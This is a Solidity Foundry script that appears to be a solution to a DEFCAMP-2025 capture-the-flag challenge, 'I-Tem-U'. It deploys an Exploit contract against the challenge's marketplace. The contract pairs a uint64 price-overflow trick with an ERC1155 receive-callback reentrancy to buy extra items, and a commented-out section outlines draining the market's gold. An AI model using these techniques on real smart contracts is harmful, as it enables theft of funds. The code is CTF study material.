pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {TemU} from "src/DEFCAMP-2025/I-Tem-U/TemU.sol";
import {iTems} from "src/DEFCAMP-2025/I-Tem-U/iTems.sol";
import {Tem} from "src/DEFCAMP-2025/I-Tem-U/Tem.sol";
import {ERC1155Holder} from "lib/openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "forge-std/StdJson.sol"; 

contract Solve is Script{
    using stdJson for *;
    function run()public{
        address temu;
        string memory Setup_path=string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(Setup_path){
            string memory json = vm.readFile(Setup_path);
            address deployed = json.readAddress(".transactions[1].contractAddress");
            temu=deployed;
        }catch{
            revert("Challenge Not Yet Deployed");
        }
        vm.startBroadcast();
        TemU market=TemU(address(temu));
        Exploit exploit=new Exploit(market);
        exploit.pwn{value: 0.1e18}();
        iTems token=market.token();
        require(token.balanceOf(address(exploit), 2)==10);
        vm.stopBroadcast();
    }
}


contract Exploit is ERC1155Holder{

    uint256 price=1e9;
    uint256 balance=1000000000000000000;
    uint256 qunatityToPurchase=1;
    TemU market;
    iTems token;
    uint256 listingIdToPurchase;
    uint8 count=0;
    constructor(TemU _market){
        market=_market;
        token=market.token();
    }

    function pwn()public payable{
        uint256 u_64_max=2**64;
        uint256 init_overflow_amount=(price* balance) %u_64_max;
        uint256 init_buy_amount=balance-(init_overflow_amount/price);
        uint256 eth_to_send= uint64(uint256(init_buy_amount)* uint256(price));
        market.buyGold{value:eth_to_send}(uint64(init_buy_amount));
        balance-=init_buy_amount;
        token.setApprovalForAll(address(market), true);
        listingIdToPurchase=market.listingsIds(0);
        market.purchaseItem(listingIdToPurchase, qunatityToPurchase);

        // Logic to drain Entire GOLD of TemU 
        /*
        uint256 transfer_value= (u_64_max/uint256(price))- balance +1;
        token.safeTransferFrom(address(this), address(market), 0, transfer_value, "");
        uint256 current_market_balance= token.balanceOf(address(market), 0);
        eth_to_send= uint64(uint256(current_market_balance)* uint256(price));
        market.buyGold{value:eth_to_send}(uint64(current_market_balance));
        console.log(token.balanceOf(address(market), 0));
        */
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        
        if(count<9 && id==2){
            count+=1;
            market.purchaseItem(listingIdToPurchase, qunatityToPurchase);

        }
        
        return this.onERC1155Received.selector;
    }

}